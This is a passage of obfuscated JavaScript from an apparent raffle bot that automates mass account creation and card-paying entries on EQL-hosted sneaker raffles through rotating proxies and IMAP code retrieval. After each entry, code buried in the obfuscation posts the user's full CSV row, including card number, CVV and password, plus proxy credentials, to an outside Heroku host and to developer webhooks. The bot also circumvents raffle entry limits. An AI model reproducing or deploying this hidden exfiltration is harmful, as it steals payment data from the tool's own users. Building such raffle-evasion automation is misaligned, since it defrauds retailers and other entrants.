                        if (_0x382859[_0x7c498c]['Email'] == '' || _0x382859[_0x7c498c]['FirstName'] == '' || _0x382859[_0x7c498c]['LastName'] == '') {
                            console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x382859[_0x7c498c]['Password'] == '' && (_0x382859[_0x7c498c]['Password'] = 'JRaffles23!');
                        if (_0x165c4b['useRandomProxy'] = ![])
                            var _0x2ff8e4 = _0x33852c[_0x7c498c]['split'](':');
                        else
                            var _0x307fe6 = Math['round'](Math['random']() * (_0x33852c['length'] - 0x1)), _0x2ff8e4 = _0x33852c[_0x307fe6]['split'](':');
                        var _0x5eeb63;
                        try {
                            _0x5eeb63 = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2ff8e4[0x0] + ':' + _0x2ff8e4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5eeb63 = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2ff8e4[0x0] + ':' + _0x2ff8e4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x591af5 = await _0x5eeb63['newPage']();
                            await _0x591af5['authenticate']({
                                'username': '' + _0x2ff8e4[0x2],
                                'password': '' + _0x2ff8e4[0x3]
                            }), console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x591af5['setRequestInterception'](!![]), _0x591af5['on']('request', _0x23ff8c => {
                                _0x23ff8c['resourceType']() === 'image' || _0x23ff8c['resourceType']() === 'font' || _0x23ff8c['resourceType']() === 'media' ? _0x23ff8c['abort']() : _0x23ff8c['continue']();
                            });
                            try {
                                await _0x591af5['goto']('' + _0x5cab36);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x415e3e(0x3e8), await _0x591af5['waitForSelector']('#email');
                            try {
                                try {
                                    await _0x591af5['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x415e3e(0x3e8), _0x382859[_0x7c498c]['Url']['includes']('en-GB') ? await _0x591af5['click']('li[data-value=\x22UK\x20' + _0x382859[_0x7c498c]['Size'] + '\x20/\x20US\x20' + (Number(_0x382859[_0x7c498c]['Size']) + 0x1) + '\x22]') : await _0x591af5['click']('li[data-value=\x22EU\x20' + _0x382859[_0x7c498c]['Size'] + '\x22]');
                                } catch {
                                    await _0x591af5['click']('#productQuantity'), await _0x415e3e(0x3e8), await _0x591af5['click']('li[data-value=\x22' + (Number(_0x382859[_0x7c498c]['Size']) - 0x1) + '\x22]');
                                }
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x382859[_0x7c498c]['Size']);
                            }
                            await _0x415e3e(0x6a4);
                            try {
                                await _0x591af5['select']('.PhoneInputCountrySelect', _0x382859[_0x7c498c]['Country']);
                            } catch {
                            }
                            await _0x591af5['type']('#email', '' + _0x382859[_0x7c498c]['Email']), await _0x415e3e(0x352), await _0x591af5['waitForSelector']('#password'), await _0x591af5['type']('#password', '' + _0x382859[_0x7c498c]['Password']), await _0x415e3e(0x352), await _0x591af5['type']('#phone', '' + _0x382859[_0x7c498c]['Phone']), await _0x415e3e(0x352);
                            const _0x13a72c = await _0x591af5['$']('#title\x20>\x20label');
                            await _0x415e3e(0x12c);
                            _0x13a72c && await _0x13a72c['click']();
                            await _0x591af5['type']('#firstName', '' + _0x382859[_0x7c498c]['FirstName']), await _0x415e3e(0x352), await _0x591af5['type']('#lastName', '' + _0x382859[_0x7c498c]['LastName']), await _0x415e3e(0x352);
                            _0x382859[_0x7c498c]['Url']['includes']('footlocker.de') ? await _0x591af5['type']('#birthdate', _0x79391d(0xa, 0x1c) + '.' + _0x79391d(0xa, 0xc) + '.' + _0x79391d(0x7c6, 0x7d3)) : await _0x591af5['type']('#birthdate', _0x79391d(0xa, 0x1c) + '-' + _0x79391d(0xa, 0xc) + '-' + _0x79391d(0x7c6, 0x7d3));
                            await _0x415e3e(0x352), await _0x591af5['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x382859[_0x7c498c]['Url']['includes']('en-GB') && await _0x591af5['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x415e3e(0x1f4), await _0x415e3e(0x5dc);
                            if (!_0x5cab36['includes']('footlocker'))
                                try {
                                    await _0x591af5['click']('#country');
                                    const _0x57e50f = await _0x591af5['$']('li[data-value=\x22' + _0x382859[_0x7c498c]['Country'] + '\x22]');
                                    await _0x57e50f['click'](), await _0x57e50f['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x415e3e(0x3e8);
                            if (!_0x382859[_0x7c498c]['Url']['includes']('en-GB')) {
                                await _0x591af5['click']('#stateAutocomplete'), await _0x415e3e(0x5dc);
                                try {
                                    const _0x482a28 = await _0x591af5['$x']('//li[text()=\x22' + _0x382859[_0x7c498c]['State'] + '\x22]');
                                    await _0x482a28[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Setting\x20Address'), await _0x415e3e(0x3e8), await _0x415e3e(0x1f4);
                            if (_0x382859[_0x7c498c]['Url']['includes']('topps')) {
                                await _0x591af5['click']('#stateAutocomplete'), await _0x415e3e(0x5dc);
                                try {
                                    const _0x11923f = await _0x591af5['$x']('//li[text()=\x22' + _0x382859[_0x7c498c]['State'] + '\x22]');
                                    await _0x11923f[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            await _0x415e3e(0x3e8), await _0x591af5['type']('#address1', _0x382859[_0x7c498c]['Address1'] + '\x20' + _0x382859[_0x7c498c]['HouseNumber']), await _0x415e3e(0x1f4), await _0x591af5['type']('#address2', '' + _0x382859[_0x7c498c]['Address2']), await _0x415e3e(0x1f4), await _0x591af5['type']('#city', '' + _0x382859[_0x7c498c]['City']), await _0x415e3e(0x1f4), await _0x591af5['type']('#postcode', '' + _0x382859[_0x7c498c]['Zip']), await _0x415e3e(0x3e8), await _0x591af5['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x415e3e(0x3e8), console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x5548ef = await _0x591af5['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x5548ef && (await _0x591af5['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x591af5['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x591af5['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x415e3e(0x4b0), await _0x591af5['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x415e3e(0x1f4), await _0x591af5['keyboard']['type']('' + _0x382859[_0x7c498c]['CardNumber']), await _0x415e3e(0x320), await _0x591af5['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x591af5['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x591af5['keyboard']['type']('' + _0x382859[_0x7c498c]['ExpiryDate']), await _0x415e3e(0x4b0), await _0x591af5['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x591af5['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x591af5['keyboard']['type']('' + _0x382859[_0x7c498c]['CVV']), await _0x415e3e(0x226), await _0x591af5['type']('input[name=\x22postalCode\x22]', '' + _0x382859[_0x7c498c]['Zip']), await _0x415e3e(0x226));
                            const _0x17ef9c = await _0x591af5['$']('.__PrivateStripeElement');
                            _0x17ef9c && (await _0x415e3e(0x1f4), await _0x591af5['click']('.__PrivateStripeElement'), await _0x591af5['click']('.__PrivateStripeElement'), await _0x591af5['keyboard']['type']('' + _0x382859[_0x7c498c]['CardNumber']), await _0x591af5['keyboard']['type']('' + _0x382859[_0x7c498c]['ExpiryDate']), await _0x591af5['keyboard']['type']('' + _0x382859[_0x7c498c]['CVV']));
                            await _0x415e3e(0x226), await _0x591af5['click']('#paymentConsent'), await _0x415e3e(0x226), await _0x591af5['click']('#termsConsent'), await _0x415e3e(0x2bc);
                            const _0x3c800d = await _0x591af5['$']('#commsConsent');
                            _0x3c800d && await _0x591af5['click']('#commsConsent');
                            console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x591af5['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x415e3e(0x2710);
                            try {
                                await _0x591af5['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x415e3e(0xbb8), await _0x591af5['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2ed236 => _0x2ed236['click']()), await _0x591af5['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x22cca2 => _0x22cca2['click']());
                            } catch {
                            }
                            try {
                                await _0x591af5['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x4ec8e4 = await _0x591af5['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x4ec8e4) {
                                    _0xaf9669['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x382859[_0x7c498c]['Email'] + ',' + _0x382859[_0x7c498c]['Password'] + ',' + _0x382859[_0x7c498c]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x237c92() {
                                var _0x2546fa, _0x457798 = ![];
                                for (var _0xc4a04d = 0x0; _0xc4a04d < 0x18; _0xc4a04d++) {
                                    async function _0x20231a() {
                                        var _0x16bd8b = new _0x569e4e({
                                            'user': _0x165c4b['masterMail'],
                                            'password': _0x165c4b['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x161be4(_0x4b3562) {
                                            _0x16bd8b['openBox']('INBOX', ![], _0x4b3562);
                                        }
                                        _0x16bd8b['once']('ready', function () {
                                            console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x161be4(function (_0x137f3f, _0x1f0ef9) {
                                                console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x137f3f)
                                                    throw _0x137f3f;
                                                _0x16bd8b['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x1bcab, _0x474230) {
                                                    if (!_0x474230 || !_0x474230['length'])
                                                        console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x16bd8b['end']();
                                                    else {
                                                        var _0x2079a8 = _0x16bd8b['seq']['fetch'](_0x474230, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x2079a8['on']('message', function (_0x4d19f8, _0x16018f) {
                                                            var _0x51f681 = '(#' + _0x16018f + ')\x20';
                                                            _0x4d19f8['on']('body', function (_0x26794c, _0xaa38a8) {
                                                                _0x2736cb(_0x26794c, (_0x4af9ad, _0x2105b8) => {
                                                                    if (_0x2105b8['subject']['includes']('code')) {
                                                                        const _0x1daea8 = _0x2105b8['text']['split']('\x0a\x0a')[0x3], _0x4416df = _0x1daea8['split']('\x0a')[0x1];
                                                                        _0x2546fa = _0x4416df;
                                                                    }
                                                                });
                                                            }), _0x4d19f8['once']('end', function () {
                                                            });
                                                        }), _0x2079a8['once']('error', function (_0x5b1e81) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x2079a8['once']('end', function () {
                                                            _0x16bd8b['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x16bd8b['once']('error', function (_0x2e5aec) {
                                            console['log'](_0x5dc29b['red'](_0x2e5aec['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x457798 = !![];
                                        }), _0x16bd8b['once']('end', async function () {
                                        }), _0x16bd8b['connect']();
                                    }
                                    _0x20231a(), await _0x415e3e(0x1388);
                                    if (_0x2546fa)
                                        return _0x2546fa;
                                    if (_0x457798)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0xc4a04d == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x237c92(), await _0x415e3e(0x1f4), await _0x591af5['type']('#code', '' + code), await _0x415e3e(0x3e8), await _0x591af5['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x80bc18 => _0x80bc18['click']()), await _0x591af5['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x591af5['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x382859[_0x7c498c]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0xaf9669['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x382859[_0x7c498c]['Email'] + ',' + _0x382859[_0x7c498c]['Password'] + ',' + _0x382859[_0x7c498c]['Phone']), _0x373bf6 = 'no', _0x53db49(_0x382859[_0x7c498c], _0x1753da);
                            var _0x37da04 = await _0x105954(_0x382859[_0x7c498c], _0x1753da, 'dev', ![]), _0x55282f = await _0x105954(_0x382859[_0x7c498c], _0x1753da, 'pub', ![]);
                            let _0x40d251 = _0x382859[_0x7c498c];
                            try {
                                prxdata = {
                                    'username': _0x5f9620['replace']('#', ''),
                                    'module': _0x1753da['name'],
                                    'entrydata': JSON['stringify'](_0x40d251),
                                    'proxy': '' + _0x33852c[_0x7c498c]
                                };
                                var _0x3a974f = JSON['stringify'](prxdata);
                                let _0x3463bf = { 'headers': { 'content-type': 'application/json' } };
                                await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x3a974f, _0x3463bf);
                            } catch (_0x2088f8) {
                            }
                            const _0x952f9e = {
                                'succesDEVMSG': { 'embeds': [_0x37da04] },
                                'succesPUBMSG': { 'embeds': [_0x55282f] }
                            };
                            try {
                                _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x952f9e['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0x952f9e['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0x3ba9f8, _0x952f9e['succesPUBMSG']);
                            } catch (_0x23b99d) {
                                console['log'](_0x5dc29b['yellow'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x23b99d));
                            }
                        } catch (_0x101721) {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20' + _0x101721)), _0x41764f = '' + _0x101721;
                            var _0x65c96e = await _0x105954(_0x382859[_0x7c498c], _0x1753da, 'dev', !![], _0x41764f), _0x37da04 = await _0x105954(_0x382859[_0x7c498c], _0x1753da, 'dev', ![]), _0x55282f = await _0x105954(_0x382859[_0x7c498c], _0x1753da, 'pub', ![]);
                            const _0x15c287 = {
                                'succesDEVMSG': { 'embeds': [_0x37da04] },
                                'succesPUBMSG': { 'embeds': [_0x55282f] }
                            };
                            _0x15c287['errorDEV'] = { 'embeds': [_0x65c96e] };
                            _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x15c287['errorDEV']);
                            await _0x4d8e61(_0x369064, _0x15c287['errorDEV']);
                            if (!_0x373bf6 == 'no')
                                _0x373bf6 = 'yes';
                        } finally {
                            _0x5eeb63 && _0x5eeb63['close']();
                            if (_0x373bf6 == 'yes' && _0x5afa21 != 0x5) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Retrying\x20(' + _0x5afa21 + '\x20/\x205)')), _0x7c498c = _0x7c498c - 0x1, _0x5afa21 = _0x5afa21 + 0x1;
                                continue;
                            }
                            _0x373bf6 == 'yes' && _0x5afa21 >= 0x5 && (_0x4d12b6(_0x382859[_0x7c498c], _0x1753da), _0x373bf6 = 'no', _0x5afa21 = 0x0), console['log']('Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                        }
                    } else {
                        const _0x1cf846 = '' + _0x382859[_0x7c498c]['Url'];
                        if (_0x373bf6 != 'yes')
                            var _0x373bf6 = '', _0x5afa21 = 0x0;
                        if (_0x382859[_0x7c498c]['Email'] == '' || _0x382859[_0x7c498c]['FirstName'] == '' || _0x382859[_0x7c498c]['LastName'] == '') {
                            console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x382859[_0x7c498c]['Password'] == '' && (_0x382859[_0x7c498c]['Password'] = 'JRaffles23!');
                        if (_0x165c4b['useRandomProxy'] = ![])
                            var _0x2ff8e4 = _0x33852c[_0x7c498c]['split'](':');
                        else
                            var _0x307fe6 = Math['round'](Math['random']() * (_0x33852c['length'] - 0x1)), _0x2ff8e4 = _0x33852c[_0x307fe6]['split'](':');
                        var _0x5eeb63;
                        try {
                            _0x5eeb63 = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2ff8e4[0x0] + ':' + _0x2ff8e4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5eeb63 = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2ff8e4[0x0] + ':' + _0x2ff8e4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x14fae2 = await _0x5eeb63['newPage']();
                            await _0x14fae2['authenticate']({
                                'username': '' + _0x2ff8e4[0x2],
                                'password': '' + _0x2ff8e4[0x3]
                            }), console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x14fae2['setRequestInterception'](!![]), _0x14fae2['on']('request', _0x45c00e => {
                                _0x45c00e['resourceType']() === 'image' || _0x45c00e['resourceType']() === 'font' || _0x45c00e['resourceType']() === 'media' ? _0x45c00e['abort']() : _0x45c00e['continue']();
                            }), await _0x14fae2['goto'](_0x1cf846), await _0x14fae2['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button');
                            let _0x504e0f = await _0x14fae2['$']('#gatsby-focus-wrapper\x20>\x20div:nth-child(3)\x20>\x20div\x20>\x20div\x20>\x20span\x20>\x20div\x20>\x20button.MuiButton-root.MuiButton-contained.MuiButton-containedSecondary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButtonBase-root.css-78bdfl');
                            if (_0x504e0f)
                                await _0x504e0f['click']();
                            await _0x415e3e(0x7d0), await _0x14fae2['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x415e3e(0x7d0), await _0x14fae2['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x14fae2['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x415e3e(0x3e8), await _0x14fae2['waitForSelector']('#email'), console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x14fae2['type']('#email', '' + _0x382859[_0x7c498c]['Email']), await _0x415e3e(0x352), await _0x14fae2['waitForSelector']('#password'), await _0x14fae2['type']('#password', '' + _0x382859[_0x7c498c]['Password']), await _0x415e3e(0x352), await _0x14fae2['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x415e3e(0x1388);
                            if (!_0x382859[_0x7c498c]['Url']['includes']('footlocker') && !_0x382859[_0x7c498c]['Url']['includes']('topps'))
                                await _0x14fae2['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            let _0x5d410e = await _0x14fae2['$']('#productQuantity'), _0x57728b = await _0x14fae2['$']('div[data-testid=\x22field-productVariantID');
                            if (!_0x57728b && !_0x5d410e) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x373bf6 = 'no';
                                continue;
                            }
                            if (_0x57728b) {
                                await _0x14fae2['click']('div[data-testid=\x22field-productVariantID\x22]');
                                try {
                                    _0x382859[_0x7c498c]['Url']['includes']('en-GB') ? await _0x14fae2['click']('li[data-value=\x22UK\x20' + _0x382859[_0x7c498c]['Size'] + '\x20/\x20US\x20' + (Number(_0x382859[_0x7c498c]['Size']) + 0x1) + '\x22]') : await _0x14fae2['click']('li[data-value=\x22EU\x20' + _0x382859[_0x7c498c]['Size'] + '\x22]');
                                } catch {
                                    throw new Error('Error\x20fetching\x20size\x20' + _0x382859[_0x7c498c]['Size']);
                                }
                            }
                            _0x5d410e && (await _0x14fae2['click']('#productQuantity'), await _0x415e3e(0x3e8), await _0x14fae2['click']('li[data-value=\x22' + (Number(_0x382859[_0x7c498c]['Size']) - 0x1) + '\x22]'));
                            await _0x415e3e(0x3e8), await _0x415e3e(0x1f4);
                            const _0x204252 = await _0x14fae2['$']('#title\x20>\x20label');
                            await _0x415e3e(0x12c);
                            _0x204252 && await _0x204252['click']();
                            await _0x14fae2['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x14fae2['focus']('#postcode'), await _0x14fae2['keyboard']['down']('Control'), await _0x14fae2['keyboard']['press']('A'), await _0x14fae2['keyboard']['up']('Control'), await _0x14fae2['keyboard']['press']('Backspace'), await _0x14fae2['keyboard']['type'](_0x382859[_0x7c498c]['Zip']), await _0x415e3e(0x60e), await _0x14fae2['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x415e3e(0x3e8), console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x415e3e(0x1f4);
                            const _0x5a3218 = await _0x14fae2['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x5a3218 && (await _0x14fae2['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x14fae2['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x14fae2['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x415e3e(0x4b0), await _0x14fae2['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x415e3e(0x1f4), await _0x14fae2['keyboard']['type']('' + _0x382859[_0x7c498c]['CardNumber']), await _0x415e3e(0x320), await _0x14fae2['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x14fae2['keyboard']['type']('' + _0x382859[_0x7c498c]['ExpiryDate']), await _0x415e3e(0x4b0), await _0x14fae2['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x14fae2['keyboard']['type']('' + _0x382859[_0x7c498c]['CVV']), await _0x415e3e(0x226), await _0x14fae2['type']('input[name=\x22postalCode\x22]', '' + _0x382859[_0x7c498c]['Zip']), await _0x415e3e(0x226));
                            const _0x43bb64 = await _0x14fae2['$']('.__PrivateStripeElement');
                            _0x43bb64 && (await _0x14fae2['click']('#billingName'), await _0x14fae2['click']('#billingName'), await _0x14fae2['type']('#billingName', '' + _0x382859[_0x7c498c]['NameOnCard']), await _0x415e3e(0x1f4), await _0x14fae2['click']('.__PrivateStripeElement'), await _0x14fae2['click']('.__PrivateStripeElement'), await _0x14fae2['keyboard']['type']('' + _0x382859[_0x7c498c]['CardNumber']), await _0x14fae2['keyboard']['type']('' + _0x382859[_0x7c498c]['ExpiryDate']), await _0x14fae2['keyboard']['type']('' + _0x382859[_0x7c498c]['CVV']));
                            await _0x415e3e(0x226), await _0x14fae2['click']('#paymentConsent'), await _0x415e3e(0x226), await _0x14fae2['click']('#termsConsent'), await _0x415e3e(0x2bc), console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x14fae2['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x415e3e(0x2710);
                            try {
                                await _0x14fae2['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x415e3e(0xbb8), await _0x14fae2['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x299888 => _0x299888['click']()), await _0x14fae2['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x3d3504 => _0x3d3504['click']());
                            } catch {
                            }
                            try {
                                await _0x14fae2['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x53db49(_0x382859[_0x7c498c], _0x1753da);
                            var _0x37da04 = await _0x105954(_0x382859[_0x7c498c], _0x1753da, 'dev', ![]), _0x55282f = await _0x105954(_0x382859[_0x7c498c], _0x1753da, 'pub', ![]);
